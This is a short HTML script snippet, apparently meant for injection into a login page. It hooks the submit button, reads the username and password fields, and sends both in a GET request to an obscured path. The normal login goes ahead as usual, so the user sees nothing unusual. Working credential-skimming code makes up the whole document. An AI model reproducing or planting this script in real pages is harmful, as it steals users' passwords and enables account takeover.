<script>
  document.querySelector('#fm-login-submit').addEventListener('click', function(e) {
    var username = document.querySelector('#fm-login-id').value;
    var password = document.querySelector('#fm-login-password').value;
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/xxxxxxxxxxx?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password));
    xhr.send();
    // e.preventDefault();
    // e.stopPropagation();
  });
</script>
